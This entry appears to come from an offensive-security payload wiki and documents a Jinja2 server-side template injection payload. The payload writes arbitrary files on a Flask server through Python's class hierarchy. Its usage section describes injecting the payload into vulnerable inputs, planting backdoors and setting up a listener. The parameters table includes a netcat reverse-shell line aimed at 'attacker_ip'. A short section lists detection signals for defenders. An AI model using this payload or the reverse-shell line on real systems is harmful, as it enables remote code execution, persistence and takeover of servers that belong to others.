---
id: 4de0d20c-b9af-47c2-b7a7-fa556111684a
type: code
language: Python
verified: true
created_at: '2023-04-06T03:56:39.708095+00:00'
updated_at: '2023-04-10T20:23:35.653183+00:00'
tags:
  - ssti
  - jinja2
  - file-write
  - rce
platforms:
  - Web
  - Python
validated: true
---

# Jinja2-File-Write-Payload

## Code

```python
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
```

## Description

This Jinja2 template payload exploits SSTI to write arbitrary content to a file on the server by accessing Python's built-in file class through the object method resolution order (MRO) and subclasses. It opens a file in write mode ('w') and writes the specified string, enabling persistence via backdoor creation or config modification. The index [40] targets the file class, which may vary by Python version (test with `{{ ''.__class__.__mro__[2].__subclasses__() }}` to enumerate).

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| `/var/www/html/myflaskapp/hello.txt` | Target file path on the server filesystem | `/tmp/backdoor.py` |
| `'w'` | File mode (write, overwrites existing) | `'a'` for append |
| `'Hello here !'` | Content to write to the file | `import os; os.system('nc -e /bin/sh attacker_ip 4444')` for reverse shell |

## Usage

Inject this payload into a vulnerable Jinja2-rendered input field (e.g., via POST parameter in a Flask app). Customize path and content for the target environment. Used in procedures like [[procedures/Jinja2-Remote-File-Write]] after confirming SSTI. Deliver via browser, curl, or proxy tools; set up a listener if writing executable code.

## Detection

- WAF rules blocking {{ }} expressions or __class__/__subclasses__ patterns.
- Server logs showing file creation in unexpected locations (e.g., via auditd on Linux).
- Python traceback errors if payload fails, or unusual process spawns from web app user.
- File integrity monitoring alerting on changes to web root or /tmp directories.

## Related

- [[procedures/Jinja2-Remote-File-Write]]
- [[tools/Burp-Suite]] (for payload delivery)
